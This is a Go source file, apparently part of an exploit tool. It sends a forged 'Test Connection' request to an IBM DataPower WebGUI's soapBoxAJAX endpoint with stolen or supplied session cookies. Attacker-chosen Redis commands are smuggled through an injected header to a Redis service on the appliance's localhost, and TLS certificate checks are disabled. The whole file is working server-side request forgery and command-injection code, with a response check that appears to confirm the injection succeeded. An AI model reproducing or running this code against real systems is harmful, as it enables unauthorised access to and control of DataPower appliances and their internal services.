package main

import (
	"crypto/tls"
	"encoding/xml"
	"fmt"
	"io/ioutil"
	//	"log"
	"net/http"
	"strconv"
	"strings"
)

func DPTestConnection(redisCommands string, redisPort int, dpCookies []*http.Cookie, endpoint string) error {
	forgedTestConnection := fmt.Sprintf(`<soapBoxRequest>
	<url>http://127.0.0.1:%d</url>
	<requestHeaders>
	<header name="info ">
%s
	</header>
	</requestHeaders>
	<requestBody>
	<t/>
	</requestBody>
	</soapBoxRequest>`, redisPort, redisCommands)
	r, err := http.NewRequest("POST", endpoint+"/webguiapp/soapBoxAJAX", strings.NewReader(forgedTestConnection))
	if err != nil {
		return err
	}
	for i := range dpCookies {
		r.AddCookie(dpCookies[i])
	}
	r.Header.Add("Content-Type", "application/xml")
	r.Header.Add("Content-Length", strconv.Itoa(len(forgedTestConnection)))
	r.Header.Add("X-DataPower-AJAX-Request", "TRUE")
	r.Header.Add("Origin", endpoint)
	r.Header.Add("Referer", endpoint+"/webguiapp/soapBoxAJAX")
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, //Note: Datapower WebGUI Certs are usally self signed.
	}
	client := &http.Client{Transport: tr}
	//log.Printf(forgedTestConnection)
	res, err := client.Do(r)
	if err != nil {
		return err
	}
	if res.Status != "200 OK" {
		return fmt.Errorf("Datapower 'Test Connection' Failed. Bad HTTP Return Code - %s", res.Status)
	}
	defer res.Body.Close()
	dpTestConnectionBody, err := ioutil.ReadAll(res.Body)
	type DPTestConnectionResponse struct {
		XMLName         xml.Name `xml:"response"`
		Text            string   `xml:",chardata"`
		Dpfunc          string   `xml:"dpfunc,attr"`
		Responsecode    string   `xml:"responsecode"`
		ContentType     string   `xml:"content-type"`
		ResponseBody    string   `xml:"response-body"`
		ResponseHeaders string   `xml:"response-headers"`
		RenderedBody    string   `xml:"rendered-body"`
	}
	var dptestconnResult DPTestConnectionResponse
	err = xml.Unmarshal(dpTestConnectionBody, &dptestconnResult)
	if err != nil {
		return err
	}
	if !strings.Contains(dptestconnResult.ResponseBody, "8") {
		return fmt.Errorf("Datapower 'Test Connection' Failed. Bad XML Return Code - %v+", dptestconnResult)
	}
	return nil
}
